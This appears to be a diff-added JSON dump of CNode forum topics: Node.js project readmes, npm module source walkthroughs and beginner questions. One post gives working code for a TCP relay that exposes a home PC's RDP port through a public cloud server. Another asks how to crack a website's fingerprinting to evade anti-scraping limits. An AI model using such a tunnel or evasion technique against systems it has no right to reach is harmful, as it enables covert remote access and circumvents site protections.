+          "content" : "<div class=\"markdown-text\"><h2>简介</h2>\n<p><strong>Hello 小伙伴们，如果觉得本文还不错，记得给个 star，你们 star 是我编写更多更丰富开源项目的动力！\n<a href=\"https://github.com/zhoushaw/Instagram\">GitHub 地址</a></strong></p>\n<blockquote>\n<p>技术栈</p>\n</blockquote>\n<ul>\n<li>react全家桶</li>\n<li>typescript</li>\n<li>ant design</li>\n<li>egg.js</li>\n<li>mysql</li>\n</ul>\n<p>\b前后端分离开发模式，前端项目与后端项目属于不同的工程</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; instagram&#x2F;client 前端工程\n&#x2F;&#x2F; instagram&#x2F;service 后端工程\n</code></pre><p>注：此项目纯属个人瞎搞，与instagram无任何关系。</p>\n<h2>部分功能截图</h2>\n<blockquote>\n<p>登录</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/12/1/16769229233487ec?w=419&amp;h=264&amp;f=gif&amp;s=903361\" alt=\"avatar\"></p>\n<blockquote>\n<p>关注</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/12/1/1676922921ea71d4?w=600&amp;h=377&amp;f=gif&amp;s=973224\" alt=\"avatar\"></p>\n<blockquote>\n<p>发帖</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/12/1/167692291f1c3d2b?w=419&amp;h=264&amp;f=gif&amp;s=2106389\" alt=\"avatar\"></p>\n<blockquote>\n<p>点赞、评论、搜索</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/12/1/167692291fdc37c2?w=419&amp;h=264&amp;f=gif&amp;s=847493\" alt=\"avatar\"></p>\n<blockquote>\n<p>修改个人信息</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/12/1/167692291cf31011?w=600&amp;h=377&amp;f=gif&amp;s=1680299\" alt=\"avatar\"></p>\n<h2>运行项目</h2>\n<p>因前后端不同端口原因，为解决跨域。前端\b工程启动了devServer，需先启动后端工程</p>\n<ul>\n<li>git clone <a href=\"https://github.com/zhoushaw/Instagram.git\">https://github.com/zhoushaw/Instagram.git</a></li>\n<li>cd Instagram</li>\n</ul>\n<blockquote>\n<p>运行后端项目</p>\n</blockquote>\n<ul>\n<li>请确保本地已装mysql，并配置全局变量</li>\n<li>mysql -u root -p 并输入数据库密码</li>\n<li>create database learn; 创建learn数据库</li>\n<li>use learn;  切换数据库</li>\n<li>source learn.sql的路径; 例如：source /Users/shawzhou/Desktop/learning/instagram/db/learn.sql;</li>\n<li>配置egg.js连接数据库信息</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 前往service&#x2F;config&#x2F;config.local.ts，配置你的数据库信息\nconfig.sequelize = {\n    dialect: &#x27;mysql&#x27;,\n    host: &#x27;127.0.0.1&#x27;,\n    port: 3306,\n    database: &#x27;learn&#x27;,\n    username: &#x27;&#x27;, \n    password: &#x27;&#x27;, \n    operatorsAliases: false\n};\n</code></pre><ul>\n<li>配置七牛云上传鉴权信息</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>\n&#x2F;&#x2F; 前往&#x2F;service&#x2F;app&#x2F;service&#x2F;qiniu.ts，配置你的七牛云获取token信息\nexport default class qiniuService extends Service {\n    &#x2F;&#x2F; 前往七牛云的个人面板=&gt;秘钥管理查看\n    private accessKey: string = &#x27;&#x27;; &#x2F;&#x2F; 秘钥\n    private secretKey: string = &#x27;&#x27;; &#x2F;&#x2F; 秘钥\n    private publicBucketDomain = &#x27;&#x27;; &#x2F;&#x2F; 外链默认域名\n\n    private options: qiniuOptioin = {\n        scope: &#x27;&#x27;, &#x2F;&#x2F; 上传空间\n        expires: 7200\n    }\n\n    &#x2F;&#x2F; ....\n}\n\n&#x2F;&#x2F; 七牛云存储空间区设置，前往&#x2F;client&#x2F;src&#x2F;components&#x2F;upload&#x2F;index.js，配置上传区\nclass Upload extends React.Component{\n\n\n    uploadFn = async () =&gt; {\n        &#x2F;&#x2F; ...\n        var config = {\n            region: qiniu.region.z0 &#x2F;&#x2F; 所属区，可前往七牛云文档查看\n        };\n        &#x2F;&#x2F; ...\n}\n</code></pre><ul>\n<li>在/service文件下</li>\n<li>npm install</li>\n<li>npm run dev</li>\n</ul>\n<blockquote>\n<p>\b运行前端项目</p>\n</blockquote>\n<ul>\n<li>cd client</li>\n<li>npm install</li>\n<li>npm start</li>\n</ul>\n<h2>目标功能</h2>\n<ul>\n<li>[x] 登录、注册    – 完成</li>\n<li>[x] 修改个人信息  --完成</li>\n<li>[x] 关注  – 完成</li>\n<li>[x] 登录、注册    – 完成</li>\n<li>[x] 修改个人信息  --完成</li>\n<li>[x] 关注  – 完成</li>\n<li>[x] 点赞  – 完成</li>\n<li>[x] 搜索帖子  – 完成</li>\n<li>[x] 上传头像  – 完成</li>\n<li>[x] 发帖  – 完成</li>\n<li>[x] 收藏  – 未完成</li>\n</ul>\n<p><strong>后记：小伙伴们，如果觉得本文还不错，记得给个 star，你们star 是我编写更多更丰富开源项目的动力！\n<a href=\"https://github.com/zhoushaw/Instagram\">GitHub 地址</a></strong></p>\n</div>",
+          "title" : "打造属于你自己的instagram! (react+egg.js全栈项目)",
+          "last_reply_at" : "2018-12-05T09:13:03.344Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 13,
+          "visit_count" : 533,
+          "create_at" : "2018-12-02T03:17:31.836Z",
+          "author" : {
+              "loginname" : "zhoushaw",
+              "avatar_url" : "https://avatars0.githubusercontent.com/u/27547179?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c063bf41c62d83349350978",
+          "author_id" : "5acd78cb042a804dc5196851",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/Fkg8GFGXI-z-Q8nHRSMnfBM6SoWG\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/FvaDmFsfOOvQ6bacVlv-uAviinMU\" alt=\"image.png\">\n这个message怎么通过res返回给前端？？</p>\n</div>",
+          "title" : "mongoose validation errors ，这个errors如何通过res返回给前端？？",
+          "last_reply_at" : "2018-12-05T09:00:50.853Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 3,
+          "visit_count" : 147,
+          "create_at" : "2018-12-04T08:33:56.721Z",
+          "author" : {
+              "loginname" : "miuqiang",
+              "avatar_url" : "https://avatars2.githubusercontent.com/u/19277011?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5b52cc67fb9e84ec69cc1ca3",
+          "author_id" : "5b52cbf1fb9e84ec69cc1ca2",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>哪里有Nodejs入门教程-对我菜鸟来说有视频最好谢谢大家。老铁们帮帮忙推荐推荐。</p>\n</div>",
+          "title" : "哪里有Nodejs入门教程-对我菜鸟来说有视频最好谢谢大家",
+          "last_reply_at" : "2018-12-05T08:00:20.850Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 40,
+          "visit_count" : 3725,
+          "create_at" : "2018-07-21T06:02:15.043Z",
+          "author" : {
+              "loginname" : "nodeper",
+              "avatar_url" : "https://avatars2.githubusercontent.com/u/41500847?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c009022d6104a4f803a3068",
+          "author_id" : "5aba15c3a2f3b49869cb2da2",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>示例如下：\n<img src=\"//static.cnodejs.org/Fhm0mgJ4fqPwh-yanXV2DXaC3FHa\" alt=\"1543479990(1).jpg\"></p>\n<p>PM2重启时能不能自定义这个restart的次数？查看了文档好久但是都没有看到相关信息。求指导？PM2 版本是V3.2.2</p>\n</div>",
+          "title" : "PM2重启时能不能自定义重启次数？",
+          "last_reply_at" : "2018-12-05T06:46:12.708Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 12,
+          "visit_count" : 533,
+          "create_at" : "2018-11-30T01:19:30.042Z",
+          "author" : {
+              "loginname" : "zurmokeeper",
+              "avatar_url" : "https://avatars2.githubusercontent.com/u/25943604?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c0763861c62d83349350f42",
+          "author_id" : "57067a058265278d59c7e61f",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><h2>1、git地址</h2>\n<p><a href=\"https://github.com/seriousManual/dedupe\">https://github.com/seriousManual/dedupe</a></p>\n<h2>2、作用</h2>\n<p>剔除一个数组中重复的元素，并输出新数组</p>\n<h2>3、例子和源码解析</h2>\n<h3>3.1 例子</h3>\n<pre class=\"prettyprint language-javascript\"><code>const dedupe = require(&#x27;dedupe&#x27;)\n\nlet fromer = [1, 3, 5, 4, 3]\nlet newer = dedupe(fromer)\nconsole.log(newer) &#x2F;&#x2F; 输出：[ 1, 3, 5, 4 ]\n\nlet fromerObjArray = [{&#x27;name&#x27;: &#x27;Frank&#x27;}, {&#x27;name&#x27;: &#x27;Sun&#x27;}, {&#x27;name&#x27;: &#x27;Quan&#x27;}, {&#x27;name&#x27;: &#x27;Huang&#x27;}, {&#x27;name&#x27;: &#x27;Gold&#x27;}]\nlet newerObjArray = dedupe(fromerObjArray)\nconsole.log(newerObjArray) &#x2F;&#x2F; 输出：[ { name: &#x27;Frank&#x27; }, { name: &#x27;Sun&#x27; }, { name: &#x27;Quan&#x27; }, { name: &#x27;Huang&#x27; }, { name: &#x27;Gold&#x27;}]\n\nlet formerComplexArray = [\n  { &#x27;age&#x27;: &#x27;28&#x27;, &#x27;name&#x27;: &#x27;Frank&#x27; },\n  { &#x27;age&#x27;: &#x27;20&#x27;, &#x27;name&#x27;: &#x27;Sun&#x27; },\n  { &#x27;age&#x27;: &#x27;21&#x27;, &#x27;name&#x27;: &#x27;Quan&#x27; },\n  { &#x27;age&#x27;: &#x27;20&#x27;, &#x27;name&#x27;: &#x27;Huang&#x27; },\n  { &#x27;age&#x27;: &#x27;20&#x27;, &#x27;name&#x27;: &#x27;Gold&#x27; }\n]\nlet newerComplexArray = dedupe(formerComplexArray)\nconsole.log(newerComplexArray) &#x2F;&#x2F; 输出：[ { age: &#x27;28&#x27;, name: &#x27;Frank&#x27; }, { age: &#x27;20&#x27;, name: &#x27;Sun&#x27; }, { age: &#x27;21&#x27;, name: &#x27;Quan&#x27; }, { age: &#x27;20&#x27;, name: &#x27;Huang&#x27; }, { age: &#x27;20&#x27;, name: &#x27;Gold&#x27; } ]\n\nlet formerArrayFun = [\n  { a: 2, b: 1 },\n  { a: 1, b: 2 },\n  { a: 1, b: 3 },\n  { a: 1, b: 4 }\n]\nlet newerAFunArray = dedupe(formerArrayFun, value =&gt; value.a)\nlet newerBFunArray = dedupe(formerArrayFun, value =&gt; value.b)\nconsole.log(newerAFunArray) &#x2F;&#x2F; 输出：[ { a: 2, b: 1 }, { a: 1, b: 2 } ]\nconsole.log(newerBFunArray) &#x2F;&#x2F; 输出：[ { a: 2, b: 1 }, { a: 1, b: 2 }, { a: 1, b: 3 }, { a: 1, b: 4 } ]\n\n</code></pre><h3>3.2 源码</h3>\n<pre class=\"prettyprint language-javascript\"><code>function dedupe (client, hasher) {\n    hasher = hasher || JSON.stringify\n\n    const clone = []\n    const lookup = {}\n\n    for (let i = 0; i &lt; client.length; i++) {\n        let elem = client[i]\n        let hashed = hasher(elem)\n\n        if (!lookup[hashed]) {\n            clone.push(elem)\n            lookup[hashed] = true\n        }\n    }\n\n    return clone\n}\n\nmodule.exports = dedupe\n</code></pre><h3>3.3 源码解析</h3>\n<p>1）该模块暴露出去的也是两个参数。如果第二个参数不存在的话，就赋值JSON.stringify；</p>\n<p>2）接着遍历目标对象，对每个元素实例化或者进行hasher操作；</p>\n<p>3）然后用lookup记录是否遍历过该元素，如果遍历过，在lookup保存该元素为true，并将元素保存到clone中；</p>\n<p>4）如果传入hasher，那么将每个元素进行hasher操作，并在lookup记录是否操作过该元素。</p>\n</div>",
+          "title" : "npm模块学习之dedupe",
+          "last_reply_at" : "2018-12-05T05:35:02.599Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 0,
+          "visit_count" : 136,
+          "create_at" : "2018-12-05T05:35:02.599Z",
+          "author" : {
+              "loginname" : "sunfeng90",
+              "avatar_url" : "https://avatars1.githubusercontent.com/u/11543206?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5bc000d015e4fd1923f48e3f",
+          "author_id" : "5b2a0c5029e6e510415b2c0f",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><p>Node.js初中高级全栈高清视频教程、全栈工程师项目实战开发基础视频教程，带你从入门到精通！</p>\n<p>01【基础】Node：nodejs快速进阶（版本4.1.0）\n<img src=\"//static.cnodejs.org/FmZ2l1AiKERlqpJJxo_GnjRtmpvK\" alt=\"2.jpg\"></p>\n<p>02【实战】node.js从入门到实战教育项目(版本v6.9.1)\n<img src=\"//static.cnodejs.org/FhH4Dh-K7d4a31xfLSm_jWS1iD4r\" alt=\"3.jpg\"></p>\n<p>03【实战】Nodejs+ES6+Webpack+Vuejs构建大型商城（版本6.10.3）\n<img src=\"//static.cnodejs.org/FvoBxx8AMU3KobeIgENDY2vi9OPj\" alt=\"4.jpg\">\n下载地址：<a href=\"http://www.sucaihuo.com/video/387.html\">http://www.sucaihuo.com/video/387.html</a></p>\n</div>",
+          "title" : "Node.js初中高级全栈高清视频教程",
+          "last_reply_at" : "2018-12-05T03:11:27.406Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 6,
+          "visit_count" : 1625,
+          "create_at" : "2018-10-12T02:02:56.504Z",
+          "author" : {
+              "loginname" : "whoknowme",
+              "avatar_url" : "https://avatars0.githubusercontent.com/u/40422811?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c073fbad3b8ab334e8dadd5",
+          "author_id" : "57067a058265278d59c7e61f",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><h2>1、git地址</h2>\n<p><a href=\"https://github.com/jonschlinkert/array-last\">https://github.com/jonschlinkert/array-last</a></p>\n<h2>2、作用</h2>\n<p>递归的合并一个或者多个数组到一个新数组</p>\n<h2>3、例子和源码解析</h2>\n<h3>3.1 例子</h3>\n<pre class=\"prettyprint language-javascript\"><code>const flatten = require(&#x27;arr-flatten&#x27;);\n\nconsole.log(flatten([1, 2, 3, 5, [[[[[8]]]]]])) &#x2F;&#x2F; 输出：[ 1, 2, 3, 5, 8 ]\n\nconsole.log(flatten([1, 2, 3, 5, [7]])) &#x2F;&#x2F; 输出：[ 1, 2, 3, 5, 7 ]\n\nconsole.log(flatten([1, 2, 3, 5, [null, [[[[[[[[10]]]]]]]]]])) &#x2F;&#x2F; 输出：[ 1, 2, 3, 5, null, 10 ]\n</code></pre><h3>3.2 源码</h3>\n<pre class=\"prettyprint language-javascript\"><code>module.exports = function (arr) {\n  return flat(arr, []);\n};\n\nfunction flat(arr, res) {\n  var i = 0, cur;\n  var len = arr.length;\n  for (; i &lt; len; i++) {\n    cur = arr[i];\n    Array.isArray(cur) ? flat(cur, res) : res.push(cur);\n  }\n  return res;\n}\n</code></pre><h3>3.3 源码解析</h3>\n<p>1）首先计算传入数组的长度；</p>\n<p>2）接着遍历数组。如果数组的某个元素也是数组，那么递归遍历该元素。如果某个元素不是数组类型，那么保存该元素。</p>\n<p>3）遍历结束，返回保存的数组。</p>\n</div>",
+          "title" : "npm模块学习之arr-flatten",
+          "last_reply_at" : "2018-12-05T03:02:18.960Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 0,
+          "visit_count" : 138,
+          "create_at" : "2018-12-05T03:02:18.960Z",
+          "author" : {
+              "loginname" : "sunfeng90",
+              "avatar_url" : "https://avatars1.githubusercontent.com/u/11543206?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c061a3b1c62d833493507c0",
+          "author_id" : "582180b9d5e70f900534345b",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><p>本人利用业余时间结合翻译工具翻译了一下sharp.js的文档，欢迎访问，个人能力有限，有不足之处还望及时指正。\n中文文档地址：<a href=\"https://yunlzhang.github.io/sharp-documents-cn/\">https://yunlzhang.github.io/sharp-documents-cn/</a>\n原文档地址：<a href=\"http://sharp.pixelplumbing.com/en/stable/api-operation/\">http://sharp.pixelplumbing.com/en/stable/api-operation/</a>\n另外本人用这个库开发一个图片裁剪小程序，欢迎大家访问，功能在不断增加中，欢迎提建议及意见。小程序码如下：\n<img src=\"//static.cnodejs.org/FiS9fIWe_qaks523j0DjpGZ5Ne8i\" alt=\"WechatIMG8.jpeg\"></p>\n</div>",
+          "title" : "sharp.js中文文档",
+          "last_reply_at" : "2018-12-05T02:56:12.097Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 7,
+          "visit_count" : 325,
+          "create_at" : "2018-12-04T06:10:03.663Z",
+          "author" : {
+              "loginname" : "JaqenZhang",
+              "avatar_url" : "https://avatars3.githubusercontent.com/u/19965441?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c07391dd3b8ab334e8dad96",
+          "author_id" : "57067a058265278d59c7e61f",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><h2>1、git地址</h2>\n<p><a href=\"https://github.com/jonschlinkert/array-last\">https://github.com/jonschlinkert/array-last</a></p>\n<h2>2、作用</h2>\n<p>获取数组最后一个或者后几个元素</p>\n<h2>3、例子和源码解析</h2>\n<h3>3.1 例子</h3>\n<pre class=\"prettyprint language-javascript\"><code>const last = require(&#x27;array-last&#x27;);\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;])) &#x2F;&#x2F; 输出：h\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;], 1)) &#x2F;&#x2F; 输出：h\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;], 3)) &#x2F;&#x2F; 输出：[ &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27; ]\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;], &#x27;3&#x27;)) &#x2F;&#x2F; 输出：[ &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27; ]\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;], undefined)) &#x2F;&#x2F; 输出：h\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;], null)) &#x2F;&#x2F; 输出：h\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;], &#x27;&#x27;)) &#x2F;&#x2F; 输出：h\n</code></pre><h3>3.2 源码</h3>\n<pre class=\"prettyprint language-javascript\"><code>var isNumber = require(&#x27;is-number&#x27;);\n\nmodule.exports = function last(arr, n) {\n  if (!Array.isArray(arr)) {\n    throw new Error(&#x27;expected the first argument to be an array&#x27;);\n  }\n\n  var len = arr.length;\n  if (len === 0) {\n    return null;\n  }\n\n  n = isNumber(n) ? +n : 1;\n  if (n === 1) {\n    return arr[len - 1];\n  }\n\n  var res = new Array(n);\n  while (n--) {\n    res[n] = arr[--len];\n  }\n  return res;\n};\n</code></pre><h3>3.3 源码解析</h3>\n<p>1）该模块一共两个参数，第一个参数是数组，第二个是或者数据的个数；</p>\n<p>2）如果第一个参数传入的不是数组，会暴露类型错误异常；</p>\n<p>3）接着获取数组的长度，如果传入的是空数组，那么就返回null；</p>\n<p>4）接着判断传入的个数n是否为数字类型。如果不是，n默认为1；</p>\n<p>5）如果n为1，那么获取数组最后一个元素，并返回；</p>\n<p>6）然后定义一个新数组res。接着在while循环中获取数组n个数据，并保存到res；</p>\n<p>7）最后返回res。</p>\n</div>",
+          "title" : "npm模块学习之array-last",
+          "last_reply_at" : "2018-12-05T02:34:05.861Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 0,
+          "visit_count" : 148,
+          "create_at" : "2018-12-05T02:34:05.861Z",
+          "author" : {
+              "loginname" : "sunfeng90",
+              "avatar_url" : "https://avatars1.githubusercontent.com/u/11543206?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5b166a1b5cd02be6409011e9",
+          "author_id" : "597220fe8f0313ff0d08d6bb",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><blockquote>\n<p>上篇帖子有人问不知道买来阿里云可以干啥，突然发现可以通过阿里云部署远程桌面代理。\n通过node来部署，代码不超过100行，估计花生壳的原理和这类似吧。</p>\n</blockquote>\n<p>需求：</p>\n<blockquote>\n<p>在外网远程桌面到家里的个人电脑</p>\n</blockquote>\n<p>一般情况下家里的电脑是没有公网IP的，所以远程桌面往往需要借助于teamviewer或者向日葵等软件。这篇文章教你用100行代码实现远程桌面到家里的电脑。 <strong>亲测有效</strong></p>\n<p><strong>1. server.js 将该程序部署到阿里云</strong></p>\n<pre class=\"prettyprint\"><code>  const net = require(&#x27;net&#x27;);\n  \n  let target = null;\n  let client = null;\n  let server = net.createServer(function(socket){\n\t  if(!target){\n\t\t  target = socket;\n\t\t  console.log(&#x27;target ready.&#x27;);\n\t  }else{\n\t\t  client = socket;\n\t\t  console.log(&#x27;client connectd to target success.&#x27;);\n\t\t  client.on(&#x27;data&#x27;,function(data){target.write(data);});\n\t\t  target.on(&#x27;data&#x27;,function(data){client.write(data);});\n\t  }\n\t  socket.on(&#x27;error&#x27;,function(err){\n\t\t console.log(&#x27;err happen:&#x27;,err,socket);\n\t  });\n\t  socket.on(&#x27;close&#x27;,function(){console.log(&#x27;connect close.&#x27;);});\n  \n  });\n  server.listen({port:12388},function(){\n\t\t  var address=server.address();\n\t\t  console.log(&quot; opened server on address %j &quot;,address);\n  })\n</code></pre><p><strong>2. client.js 将该程序部署到你需要连接的家中的电脑</strong>  <em>39.108.22.116为你的阿里云的公网IP</em></p>\n<pre class=\"prettyprint\"><code>  const net = require(&#x27;net&#x27;);\n  let flag1 = 0, flag2 = 0;\n  let target = new net.Socket();\n  target.connect({host:&#x27;localhost&#x27;,port:3389},function(){\n\t  console.log(&#x27;connect localhot:3389 success.&#x27;);\n\t  flag1 = 1;\n  });\n  let server = new net.Socket();\n  server.connect({host:&#x27;39.108.22.116&#x27;,port:12388},function(){\n\t  console.log(&#x27;connect 39.108.22.116:12388 success.&#x27;);\n\t  flag2 = 1;\n  });\n  function conn(){\n\t  server.on(&#x27;data&#x27;,function(data){target.write(data);});\n\t  target.on(&#x27;data&#x27;,function(data){server.write(data);});\n  }\n  setTimeout(conn,10000);\n</code></pre><p><strong>3. 好了万事俱备。 在第3台电脑上打开远程桌面连接直接输入39.108.22.116:12388吧，然后输入用户名和密码就可以连接到家中的电脑了。</strong></p>\n</div>",
+          "title" : "阿里云可以干啥",
+          "last_reply_at" : "2018-12-05T02:23:48.969Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 6,
+          "visit_count" : 834,
+          "create_at" : "2018-06-05T10:46:51.681Z",
+          "author" : {
+              "loginname" : "lovegnep",
+              "avatar_url" : "https://avatars0.githubusercontent.com/u/29669264?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c072913d3b8ab334e8dacbe",
+          "author_id" : "5b6b991258db3ccf66a4533e",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>之前用bootcdn，10月份挂了一段时间听说维护者已经撤了，才换jsdelivr。现在jsdelivr也不行了吗？\n求大佬们推荐还有什么稳定的公共cdn呢\n<img src=\"//static.cnodejs.org/Fpqz7ksAuiyUT-OTWxb4boD3FiKi\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/FtAuXML8W2tcP_IMAU0-hitLG1VA\" alt=\"image.png\"></p>\n</div>",
+          "title" : "jsdelivr被墙了？求大佬们推荐稳定的公共cdn",
+          "last_reply_at" : "2018-12-05T02:22:22.204Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 1,
+          "visit_count" : 178,
+          "create_at" : "2018-12-05T01:25:39.244Z",
+          "author" : {
+              "loginname" : "CaanDoll",
+              "avatar_url" : "https://avatars1.githubusercontent.com/u/23540471?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c072c3b1c62d83349350d85",
+          "author_id" : "59964933bae6f2ed6f7e4af9",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>有没有egg-logger传输到Logstash的一些demo可以分享下</p>\n</div>",
+          "title" : "有没有egg-logger传输到Logstash的一些demo可以分享下",
+          "last_reply_at" : "2018-12-05T01:39:07.884Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 0,
+          "visit_count" : 137,
+          "create_at" : "2018-12-05T01:39:07.884Z",
+          "author" : {
+              "loginname" : "PowerDos",
+              "avatar_url" : "https://avatars0.githubusercontent.com/u/19368599?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c03b36d39c0af64fddb7d9b",
+          "author_id" : "58d83c586f8b9bf02d1d0b1d",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>node 要学到什么程度才能不被喷</p>\n</div>",
+          "title" : "怎么样才能只凭借着JS成为不被喷的全栈工程师",
+          "last_reply_at" : "2018-12-05T00:13:11.040Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 30,
+          "visit_count" : 931,
+          "create_at" : "2018-12-02T10:26:53.326Z",
+          "author" : {
+              "loginname" : "ResJay",
+              "avatar_url" : "https://avatars0.githubusercontent.com/u/26635410?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5bf28a10e6481c5709f5d3b9",
+          "author_id" : "5b4fdf5faef62f1b0f9e0434",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>我遇到了这样一个问题,：\n\t在爬取http://www.marinetraffic.com 这个网站的过程中，发现 有反爬虫机制，尝试了代理ip等方式都失败了。\n\t最后发现是因为这个网站会对机器生成一个机器指纹，限制访问频率：如下图:\n\t<img src=\"//static.cnodejs.org/FlgQAj_nRGqHwx3FKyTtWT4MZVdB\" alt=\"image.png\">\n\t然后我就在这个网站的js文件里翻这个fingerprint的生成函数，然后我找到了这个：\n\t<img src=\"//static.cnodejs.org/Fmnr6rK5ZHcNHHuKbA-NM57EGYo7\" alt=\"image.png\">\n\t然后我在调试这个函数的时候发现，这个函数生成的Fingerprint和最后传给服务器的并不一样,传递给服务器的指纹如下图：\n\t<img src=\"//static.cnodejs.org/Fsu-UnUgHpCX3uGASwuR3e7_Wctb\" alt=\"image.png\">\n\t但是这个函数生成的只是一串数字，\n\t有没有大牛有好的方法呢？</p>\n</div>",
+          "title" : "如何破译前端代码？",
+          "last_reply_at" : "2018-12-04T20:02:01.985Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 6,
+          "visit_count" : 1012,
+          "create_at" : "2018-11-19T10:01:52.617Z",
+          "author" : {
+              "loginname" : "assmdx",
+              "avatar_url" : "https://avatars2.githubusercontent.com/u/19722693?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c0690551c62d83349350bf2",
+          "author_id" : "57067a058265278d59c7e61f",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><h2>1、git地址</h2>\n<p><a href=\"https://github.com/dcousens/is-sorted\">https://github.com/dcousens/is-sorted</a></p>\n<h2>2、作用</h2>\n<p>判断一个数组是否已经排序</p>\n<h2>3、例子和源码解析</h2>\n<h3>3.1 例子</h3>\n<pre class=\"prettyprint language-javascript\"><code>const sorted = require(&#x27;is-sorted&#x27;);\nconsole.log(sorted([7, 8, 11]))        &#x2F;&#x2F; 输出：true\nconsole.log(sorted([66, 55, 1]))       &#x2F;&#x2F; 输出：false\nconsole.log(sorted([45, 2, 55], function (a, b) {return b - a}))    &#x2F;&#x2F; 输出：false\n</code></pre><h3>3.2 源码</h3>\n<pre class=\"prettyprint language-javascript\"><code>function defaultComparator (a, b) {\n return a - b\n} \nmodule.exports = function checksort (array, comparator) {\n if (!Array.isArray(array)) throw new TypeError(&#x27;Expected Array, got &#x27; + (typeof array))\n comparator = comparator || defaultComparator\n for (var i = 1, length = array.length; i &lt; length; ++i) {\n   if (comparator(array[i - 1], array[i]) &gt; 0) return false\n }\n return true\n}\n</code></pre><h3>3.3 源码解析</h3>\n<p>1）is-sorted暴露出的函数有两个参数，第一个参数必须是数组，第二个是函数。如果第一个不是数组，那么就会报类型错误的异常；</p>\n<p>2）如果外界调用函数的时候传入comparator，那么就那comparator的规则比较数组的前后两个元素，否则就按照默认的defaultComparator来比较。</p>\n<p>3）接着遍历传入的数组：\n如果没有传入comparator，那么就使用默认的defaultComparator来比较，也就是如果前面的元素比后面的元素大，就返回false。等到遍历结束，如果没有找到前面比后面大的元素，那么就返回true。\n如果传入了comparator，那么就按照comparator比较前后的元素，只要函数comparator返回的结果大于0，那么就返回false。否则就返回true。</p>\n</div>",
+          "title" : "npm模块学习之is-sorted",
+          "last_reply_at" : "2018-12-04T14:33:57.135Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 0,
+          "visit_count" : 184,
+          "create_at" : "2018-12-04T14:33:57.135Z",
+          "author" : {
+              "loginname" : "sunfeng90",
